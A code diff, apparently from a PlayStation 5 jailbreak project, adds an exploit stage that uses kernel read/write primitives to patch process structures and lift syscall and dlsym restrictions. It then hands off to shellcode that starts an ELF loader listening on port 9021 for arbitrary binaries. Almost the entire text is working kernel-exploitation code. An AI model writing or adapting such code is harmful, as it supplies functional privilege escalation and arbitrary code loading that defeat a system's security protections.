@@ -1743,6 +1743,51 @@
                 return;
             }
             try {
+                // ----- Primary: Y2JB 1.4+ kexp handoff -----
+                if (typeof load_aioshellcode === "function") {
+                    await ulog("stage_elfldr: Y2JB >= 1.4 detected, using kexp handoff");
+
+                    const is_kptr = (v) =>
+                        (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
+
+                    const p_dynlib = S.kread64(S.curproc + 0x3E8n);
+                    if (!is_kptr(p_dynlib))
+                        throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));
+                    const dynlib_eboot = S.kread64(p_dynlib + 0x00n);
+                    if (!is_kptr(dynlib_eboot))
+                        throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));
+                    const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
+                    if (!is_kptr(eboot_segments))
+                        throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));
+                    await ulog("stage_elfldr: dynlib=" + toHex(p_dynlib) +
+                        " eboot=" + toHex(dynlib_eboot) +
+                        " segs=" + toHex(eboot_segments));
+
+                    S.kwrite64(p_dynlib + 0xF0n, 0n);
+                    S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
+                    S.kwrite64(eboot_segments + 0x08n, 0n);
+                    S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
+                    await ulog("stage_elfldr: dynlib patched " +
+                        "(syscalls + dlsym unrestricted)");
+
+                    const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
+                    const master_pipe = [BigInt(S.master_rfd), BigInt(S.master_wfd)];
+                    const victim_pipe = [BigInt(S.victim_rfd), BigInt(S.victim_wfd)];
+                    await ulog("stage_elfldr: handoff -> load_aioshellcode " +
+                        "(allproc=" + toHex(allproc) +
+                        " master=" + S.master_rfd + "," + S.master_wfd +
+                        " victim=" + S.victim_rfd + "," + S.victim_wfd + ")");
+
+                    await load_aioshellcode(allproc, master_pipe, victim_pipe);
+
+                    await ulog("stage_elfldr: load_aioshellcode returned - " +
+                        "elfldr should now be listening on :9021");
+                    send_notification("Stage 7\nelfldr running - send your ELF to\n" +
+                        "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
+                    return;
+                }
+
+                // ----- Fallback: legacy USB ELF loader (Y2JB < 1.4) -----
                 if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
                     typeof elf_wait_for_exit !== "function" ||
                     typeof ipv6_kernel_rw === "undefined") {
